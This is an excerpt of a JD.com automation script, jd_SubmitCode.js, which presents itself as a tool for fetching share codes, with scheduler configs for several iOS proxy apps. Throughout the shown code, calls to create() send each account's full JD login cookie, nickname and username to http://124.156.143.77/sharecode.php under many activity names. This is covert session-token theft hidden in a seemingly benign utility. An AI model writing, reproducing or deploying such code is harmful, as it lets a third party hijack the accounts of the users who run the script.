...
更新地址：https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_SubmitCode.js
已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#获取互助码
20 2 * * * https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_SubmitCode.js, tag=获取互助码, enabled=true

================Loon==============
[Script]
cron "20 2 * * *" script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_SubmitCode.js, tag=获取互助码

===============Surge=================
获取互助码 = type=cron,cronexp="20 2 * * *",wake-system=1,timeout=120,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_SubmitCode.js

============小火箭=========
获取互助码 = type=cron,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_SubmitCode.js, cronexpr="20 13 * * 6", timeout=200, enable=true
 */
const $ = new Env("获取互助码");
...
!(async () => {
  ...
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
	  ...
	  create(`http://124.156.143.77/sharecode.php?id=ck@${$.nickName}@${$.UserName}@city@${cookie}`,"城城领现金");
      //await getShareCode()
    }
  }
})()
              ...
              for(let vo of $.tasks){
                if(vo.taskType==="1" || vo.taskType==="2" || vo.taskType==="5" || vo.taskType==="3") {
                  ...
                  if (vo.subItem.length){
					...
					create(`http://124.156.143.77/sharecode.php?id=${vo.subItem[0].itemToken}@${$.nickName}@${$.UserName}@immortal@${cookie}`,"神仙书院")
                  }else{
              ...
              if (data.data.bizCode === 0) {
                ...
                $.taskVos.map((item) => {
                  if (item.taskType === 14) {
					...
					create(`http://124.156.143.77/sharecode.php?id=${item.assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@ddfactory@${cookie}`,"东东工厂");
                  }
                });
              }
            }
          ...
          if (err) {
            ...
            if (safeGet(data)) {
              ...
              if ($.taskList.filter(item => !!item && item['taskId']=== 3) && $.taskList.filter(item => !!item && item['taskId']=== 3).length) {
				...
				create(`http://124.156.143.77/sharecode.php?id=${$.taskList.filter(item => !!item && item['taskId']=== 3)[0]['itemId']}@${$.nickName}@${$.UserName}@jdzz@${cookie}`,"京东赚赚");
              }
            }
          }
        } catch (e) {
...
async function getJDFruit() {
  ...
  async function jdFruit() {
    ...
    if ($.farmInfo.farmUserPro) {
	  ...
	  create(`http://www.helpu.cf/jdcodes/submit.php?code=${$.farmInfo.farmUserPro.shareCode}&type=farm`,"京东农场");
	  await $.wait(5000);
    } else {
      /*console.log(
        ...
        if (err) {
          ...
          if (safeGet(data)) {
            ...
            if (data.success && data.data && data.data.userInviteCode) {
			  ...
			  create(`http://124.156.143.77/sharecode.php?id=${data.data.userInviteCode}@${$.nickName}@${$.UserName}@jdcrazyjoy@${cookie}`,"疯狗Joy");
            }
          }
        }
      } catch (e) {
            ...
            if (data.data.bizCode === 0) {
              for (let i = 0; i < data.data.result.taskVos.length; i++) {
                if (data.data.result.taskVos[i].taskName === '邀人助力任务') {
				  ...
				  create(`http://www.helpu.cf/jdcodes/submit.php?code=${data.data.result.taskVos[i].assistTaskDetailVo.taskToken}&type=sgmh`,"闪购盲盒");
				  await $.wait(5000);
                }
              }
            }
        ...
        if (err) {
          ...
          if (safeGet(data)) {
            ...
            if (data.data && !data.data.result.userActBaseInfo.inviteId) {
			  ...
			  create(`http://124.156.143.77/sharecode.php?id=${data.data && data.data.result.userActBaseInfo.inviteId}@${$.nickName}@${$.UserName}@city@${cookie}`,"城城领现金");
            }
          }
        }
      } catch (e) {
